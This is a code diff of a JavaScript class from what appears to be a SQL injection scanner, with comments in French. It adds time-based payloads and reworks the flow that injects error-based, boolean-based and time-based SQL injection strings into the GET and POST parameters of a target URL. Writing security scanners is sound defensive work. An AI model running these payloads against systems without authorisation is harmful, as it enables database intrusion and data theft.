@@ -1,120 +1,119 @@
 import { Scanner } from './Scanner.js'
 import { removeTrailingSlash, sendRequest } from './utils.js' 
 
+/**
+ * Classe responsable de l'injection de payloads SQL
+ * Elle teste différents types de SQL Injection :
+ *  - Fuzzing
+ *  - Error-based
+ *  - Boolean-based
+ *  - Time-based
+ */
 export class Injecter {
+
+    //Payloads simples de fuzzing pour provoquer des erreurs SQL visibles
     static fuzzingPayload = ["'", '"', "%5C", "')", '")', '";', "';"];
+    //Payloads pour détecter les injections SQL basées sur les erreurs
     static ErrorBasedPayload = [
         "' AND (SELECT 1 FROM (SELECT(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))))a)--",
         "' AND 1=CAST((SELECT version()) AS INT)--",
         "' AND 1=CONVERT(int,@@version)--",    
-    ]
-
+    ];
+    /**
+     * Payloads pour les injections SQL booléennes (vrai / faux)
+     * Chaque tableau contient :
+     *  - une requête vraie
+     *  - une requête fausse
+     */
     static BooleanBasedPayload = [
-        [
-            "AND 1=1--",
-            "AND 1=2--"
-        ],
-        [
-            "' AND 1=1--",
-            "' AND 1=2--"
-        ],
-         [
-            '" AND 1=1--',
-            '" AND 1=2--'
-        ],
-        [
-            "%' AND 1=1 AND '%'='--",
-            "%' AND 1=2 AND '%'='--"
-        ]
-    ]
+        ["AND 1=1--", "AND 1=2--"],
+        ["' AND 1=1--", "' AND 1=2--"],
+        ['" AND 1=1--', '" AND 1=2--'],
+        ["%' AND 1=1 AND '%'='--", "%' AND 1=2 AND '%'='--"]
+    ];
+    //Payloads pour détecter les injections SQL basées sur le temps
+    static TimeBasedPayload = [
+        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
+        "' AND 5=CAST((SELECT pg_sleep(5)) AS INT)--",
+        "'; WAITFOR DELAY '0:0:5'--",
+        "' AND 1=dbms_pipe.receive_message('a',5)--"
+    ];
 
+    /**
+     * @param {object} cible - Élément de l'attack surface (URL, méthode, paramètres)
+     */
     constructor (cible) {
         this.cible = cible;
-        this.result = 
-            {
-                url : this.cible.url,
-                parameter : "",
-                method : this.cible.method,
-                vulnerabilityType : "",
-                confidence : "",
-                score : 0,
-                payloadSent : ""
-            };
+        //Résultat final du scan
+        this.result = {
+            url : this.cible.url,
+            parameter : "",
+            method : this.cible.method,
+            vulnerabilityType : "",
+            confidence : "",
+            score : 0,
+            payloadSent : ""
+        };
+        //Réponse de référence sans injection
         this.baseline;
     }
-    //---------------------------------------------------------------------------
 
-    //Appeller par le scan
+    // ---------------------------------------------------------------------------
+
+    //Méthode principale appelée par le scanner. Elle orchestre toutes les phases d'injection
     async inject() {
         this.baseline = await this.getBaselineResponse();
-
         const resultOfFuzzingPayload = await this.injectFuzzingPayload();
-        console.log(this.result);
         if (resultOfFuzzingPayload === "END") {
             return this.result;
         } else if (resultOfFuzzingPayload === "CONTINUE") {
-            
             await this.injectErrorPayload();
-            console.log(this.result);
             return this.result;
         } else if (resultOfFuzzingPayload === "COMPLEX CONTINUE") {
             const resultOfBooleanPayload = await this.injectBooleanPayload();
             if(resultOfBooleanPayload === "END") {
                 return this.result;
             }
-            else {
-                return this.result;
-            }
+            await this.injectTimeBasedPayload();
         }
-        //SI NO VULNERABILITY OU SI 301 et 302 FAIRE LES INJECTIONS COMPLEXE
+        return this.result;
     }
 
-//     Score Cumulé	Niveau de Confiance	Couleur	Signification
-// 100+	CRITIQUE	Rouge 🔴	Erreur SQL explicite trouvée. Faille certaine.
-// 80 - 99	ÉLEVÉ	Orange 🟠	Pas d'erreur texte, mais injection temporelle (SLEEP) réussie.
-// 45 - 79	MOYEN	Jaune 🟡	Erreur HTTP 500 ou changement de contenu suspect (Boolean).
-// 0 - 44	FAIBLE / AUCUN	Gris ⚪	Comportement normal du serveur.
-
+    /**
+     * Injection des payloads de fuzzing
+     * @returns {string}
+     */
     async injectFuzzingPayload() {
         for (const inject of Injecter.fuzzingPayload) {
             let injectedResults = await this.injectPayloadMultipleParams(inject);
-
             for (const injectedResult of injectedResults) {
-                const scanResult = Scanner.scanFuzzingPayload(this.baseline, injectedResult.response);
+                const scanResult = Scanner.scanFuzzingPayload(this.baseline, injectedResult.response, this);
                 if (scanResult !== null) {
-                    if (scanResult.type === "Error-based SQL Injection") {
-                        this.changeResult(injectedResult.injectedParam, `Error SQL Injection : [${scanResult.evidence}], Database type : ${scanResult.database}`, "CONFIRMED", scanResult.addToScore, inject);
-                        return "END";
-                    } else if (scanResult.error === 500) {
-                        this.changeResult(injectedResult.injectedParam, "Internal Server Error", "HIGH", scanResult.addToScore, inject);
-                        return "CONTINUE";
-                    } else if (scanResult.error === 403 || scanResult.error === 406 || scanResult.error === 400) {
-                        this.changeResult(injectedResult.injectedParam, "Blocked By WAF", "-", scanResult.addToScore, inject);
-                        return "END";
-                    } else if (scanResult.error === 301 || scanResult.error === 302 || scanResult.error === 400) {
-                        this.changeResult(injectedResult.injectedParam, "Redirection", "-", scanResult.addToScore, inject);
-                        return "COMPLEX CONTINUE";
-                    } 
+                    this.result.payloadSent = inject;
+                    this.result.parameter = injectedResult.injectedParam;
+                    return scanResult;
                 }
             }
         }
-
         return "COMPLEX CONTINUE";
     }
 
+    //Injection des payloads SQL Error-based
     async injectErrorPayload() {
         let payloads = this.changeErrorBasedPaylaods();
         for (const payload of payloads) {
             let injectedResult = await this.injectPayloadSimpleParam(payload, this.result.parameter);
-            const scanResult = Scanner.checkSQLError(this.baseline, injectedResult.response);
-            if (scanResult !== null) {
-                this.changeResult(null, `Error SQL Injection : [${scanResult.evidence}], Database type : ${scanResult.database}`, "CONFIRMED", scanResult.addToScore, payload)
+            const scanResult = Scanner.checkSQLError(this.baseline, injectedResult.response, this);
+            if (scanResult === "END") {
+                this.result.payloadSent = payload;
+                return "END";
             }
         }
         await this.injectErrorBasedRescuePayload();
         return "END";
     }
 
+    //Tentative de confirmation avec un payload de secours
     async injectErrorBasedRescuePayload(){
         let payload = this.result.payloadSent + "--";
         let rescueInjection = await this.injectPayloadSimpleParam(payload, this.result.parameter);
@@ -123,6 +122,7 @@ export class Injecter {
         }
     }
 
+    //Adapte les payloads Error-based au caractère injecté détecté
     changeErrorBasedPaylaods() {
         let payloads = [];
         for (const payload of Injecter.ErrorBasedPayload) {
@@ -131,63 +131,74 @@ export class Injecter {
         return payloads;
     }
 
-    //Injection complexe
+    //Injection SQL Boolean-based
     async injectBooleanPayload() {
         for (const [injection1, injection2] of Injecter.BooleanBasedPayload) {
             let responseTrue = await this.injectPayloadMultipleParams(injection1);
             let responseFalse = await this.injectPayloadMultipleParams(injection2);
             for (let i = 0; i < responseTrue.length; i++) {
-                const scanResult = Scanner.scanBooleanPayload(responseTrue[i].response, responseFalse[i].response);
+                const scanResult = Scanner.scanBooleanPayload(responseTrue[i].response, responseFalse[i].response, this);
                 if(scanResult) {
-                    this.changeResult(responseTrue[i].injectedParam, "BOOLEAN-BASED INJECTION", "HIGH", 80, (injection1 + " AND " + injection2));
+                    this.result.payloadSent = injection1 + " AND " + injection2;
                     return "END";
                 }
             }
         }
-        return "TIMEBASED CONTINUE";
-        
+        return "CONTINUE";
     }
 
+    //Injection SQL basée sur le temps de réponse
     async injectTimeBasedPayload() {
-        let startTime = performance.now();
-        response = await this.injectPayloadMultipleParams("SLEEP(5)");
-        let endTime = performance.now();
-        const duration1 = endTime - startTime;
-        
-        startTime = performance.now();
-        response = await this.injectPayloadMultipleParams("pg.sleep(5)");
-        endTime = performance.now();
-        const duration2 = endTime - startTime;
-        
-        //Check if it worked then
+        let durationMoyen = 0;
+        // Calcul du temps de réponse moyen
+        for (let i = 0; i < 3; i++) {
+            const startTime = performance.now();
+            await this.getBaselineResponse();
+            const endTime = performance.now();
+            durationMoyen += ((endTime - startTime) / 1000);
+        }
+        durationMoyen /= 3;
+        for (const injection of Injecter.TimeBasedPayload) {
+            for (const paramToInject of this.cible.params) {
+                const startTime = performance.now();
+                await this.injectPayloadSimpleParam(injection, paramToInject);
+                const endTime = performance.now();
+                const duration = (endTime - startTime) / 1000;
+                if(duration > (5 + 0.2) * 0.9) {
+                    this.changeResult(paramToInject, "TIME-BASED SQL Injection", "CONFIRMED", 90, injection);
+                    return "END";
+                }
+            }
+        }
+        return "END";        
     }
 
-    //---------------------------------------------
+    // ---------------------------------------------------------------------------
 
-    //Recois une réponses classique sans sqli pour la baseline
+    //Récupère la réponse de référence sans injection
     async getBaselineResponse() {
         const params = this.createParams();
-
         if (this.cible.source === "link") {
             let craftedUrlBaseline = "";
             for (const [param, value] of params) {
-                craftedUrlBaseline = removeTrailingSlash(this.cible.url) +`?${param}=${value}`;
-            }   
+                craftedUrlBaseline = removeTrailingSlash(this.cible.url) + `?${param}=${value}`;
+            }
             return await sendRequest(craftedUrlBaseline);
         }
-            return await sendRequest(this.cible.url);
+        return await sendRequest(this.cible.url);
     }
 
+    //Génère la liste des paramètres avec des valeurs par défaut
     createParams(){
         return this.cible.params.map(param => {
             if(param instanceof Object) {
                 return [Object.keys(param)[0], Object.values(param)[0]];
-            } else {
-                return [param, "1"];
             }
+            return [param, "1"];
         });
     }
 
+    //Met à jour l'objet résultat
     changeResult(param = null, vulnerabilityType = null, confidence = null, score = null, payloadSent = null){
         if (param !== null) this.result.parameter = param;
         if (vulnerabilityType !== null) this.result.vulnerabilityType = vulnerabilityType;
@@ -196,6 +207,7 @@ export class Injecter {
         if (payloadSent !== null) this.result.payloadSent = payloadSent;
     }
 
+    //Injecte un payload sur tous les paramètres
     async injectPayloadMultipleParams(payload) {
         if (this.cible.method === "POST") {
             return await this.injectPayloadsPOST(payload);
@@ -203,19 +215,18 @@ export class Injecter {
         return await this.injectPayloadsGET(payload);
     }
 
-    //Injection GET Basique, test tout les parametres
+    //Injection GET sur tous les paramètres
     async injectPayloadsGET(payload) {
         const params = this.createParams();
         let responses = [];
-
-        for (const [paramToInject, _] of params) {
+        for (const [paramToInject] of params) {
             const response = await this.injectPayloadsGETSimpleParam(payload, paramToInject, params);
             responses.push(response);
         }
         return responses;
     }
 
-    //Créer une autre fonction qui permet de tester qu'un seul parametres
+    //Injection POST sur tous les paramètres
     async injectPayloadsPOST(payload) {
         let responses = [];
         for (const param of this.cible.params) {
@@ -225,6 +236,7 @@ export class Injecter {
         return responses;
     }
 
+    //Injection ciblée sur un seul paramètre
     async injectPayloadSimpleParam(payload, paramToInject) {
         if (this.cible.method === "POST") {
             return await this.injectPayloadsPOSTSimpleParam(payload, paramToInject);
@@ -232,20 +244,18 @@ export class Injecter {
         return await this.injectPayloadsGETSimpleParam(payload, paramToInject, this.createParams());
     }
 
-    //Injection GET Basique, test qu'une seul parametre
+    //Injection GET sur un seul paramètre
     async injectPayloadsGETSimpleParam(payload, paramToInject, params) {
         let craftedUrl = removeTrailingSlash(this.cible.url) + "?";
         for(const [param, value] of params) {
             if (param === paramToInject) {
                 craftedUrl += `${param}=${payload}&`;
+            } else {
+                craftedUrl += `${param}=${value}&`;
             }
-            else {
-                craftedUrl += `${param}=${value}&`
-            }
-            craftedUrl = craftedUrl.slice(0, -1);
         }
-
-        console.log(`Injecting payload into (GET): ${craftedUrl}`);
+        craftedUrl = craftedUrl.slice(0, -1);
+        //console.log(`Injecting payload into (GET): ${craftedUrl}`);
         const response = await sendRequest(craftedUrl);
         return {
             injectedParam : paramToInject,
@@ -253,23 +263,22 @@ export class Injecter {
         };
     }
 
-    //Enlever les cibles et url ici, utiliser this 
+    //Injection POST sur un seul paramètre (gestion CSRF incluse)
     async injectPayloadsPOSTSimpleParam(payload, paramToInject) {
         let postData = {};
         for (const param of this.cible.params) {
-
-            //pour les tokens csrf
-            if (param instanceof Object && param === paramToInject) {
+            if (param instanceof Object) {
                 const key = Object.keys(param)[0];
                 postData[key] = `${Object.values(param)[0]}`;
-            } else if (param === paramToInject) {
+            } 
+            else if (param === paramToInject) {
                 postData[param] = payload;
-            } else {
+            } 
+            else {
                 postData[param] = "test";
             }
         }
-
-        console.log(`Injecting payload into form (POST): ${this.cible.url}`);
+        //console.log(`Injecting payload into form (POST): ${this.cible.url}`);
         const response = await sendRequest(this.cible.url, "POST", postData);
         return {
             injectedParam : paramToInject,
